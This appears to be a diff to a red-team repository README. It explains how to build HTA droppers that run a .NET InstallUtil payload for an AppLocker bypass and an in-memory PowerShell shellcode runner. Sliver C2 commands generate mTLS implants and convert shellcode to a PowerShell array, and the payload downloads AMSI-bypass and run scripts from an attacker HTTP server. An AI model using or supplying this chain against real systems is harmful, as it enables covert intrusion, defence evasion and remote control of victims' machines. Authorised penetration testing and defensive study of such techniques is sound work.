@@ -15,13 +15,13 @@
 | File | Placeholder | What it must be |
 |---|---|---|
 | `black.hta` | `shell.exe` | A **.NET InstallUtil payload** — a compiled C# assembly with a `[RunInstaller(true)]` installer class. **Not** a raw Go/Sliver implant: `InstallUtil.exe /U` only loads and executes *.NET* installer assemblies. |
-| `red.hta` | `payload.ps1` | Any **PowerShell** script to run in memory — e.g. a Sliver `--format ps1` byte array fed into `ps-loaders/ps-shellcode-runner.ps1`, or a simple download cradle. |
+| `red.hta` | `payload.ps1` | Any **PowerShell** script to run in memory — e.g. `ps-loaders/ps-shellcode-runner.ps1` with a Sliver shellcode byte array (via `sliver2arrays.py --ps1`), or a simple download cradle. |
 
 ### Why `black.hta` needs a .NET payload (not a Go implant)
 
 `InstallUtil.exe /U` is the .NET Assembly Installer tool. With `/U` it loads an assembly
 and invokes its installer class's `Uninstall()` method. A raw Sliver/Go implant
-(`sliver > generate ... --format raw`) is **not** a .NET assembly, so InstallUtil cannot
+(`sliver > generate ... --format exe`) is **not** a .NET assembly, so InstallUtil cannot
 run it.
 
 The repo already ships a ready-made .NET payload for this exact chain:
@@ -45,8 +45,9 @@ fresh runspace. See `word-macro/installutil-applocker-bypass/README.md`.
 ## black.hta
 
 > **`shell.exe` = your .NET InstallUtil payload** — compile `installutil.cs` from
-> `word-macro/installutil-applocker-bypass/`, **not** a Sliver/Go implant. At runtime it
-> downloads `amsi.txt` + `run.txt` from your HTTP server and runs them in a fresh runspace.
+> `word-macro/installutil-applocker-bypass/`, **not** a Sliver/Go implant. At runtime
+> `shell.exe` downloads `amsi.txt` + `run.txt` from your HTTP server and runs them in a
+> fresh runspace.
 
 **1. Compile the .NET payload as `shell.exe`:**
 ```powershell
@@ -86,10 +87,11 @@ sliver > mtls --lhost <IP> --lport 443
 > **`payload.ps1` = your in-memory PowerShell payload** (e.g. a Sliver PS1 shellcode runner
 > or a download cradle). No disk write.
 
-**1. Prepare `payload.ps1`** — e.g. generate a Sliver PS1 array and feed it into
-`ps-loaders/ps-shellcode-runner.ps1`:
+**1. Prepare `payload.ps1`** — e.g. generate Sliver shellcode, convert to a
+PowerShell array, then feed it into `ps-loaders/ps-shellcode-runner.ps1`:
 ```text
-sliver > generate --mtls <IP>:443 --format ps1 --save /tmp/payload.ps1
+sliver > generate --mtls <IP>:443 --format shellcode --save /tmp/sc.bin
+python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1
 ```
 
 **2. Host `payload.ps1` on your HTTP server:**
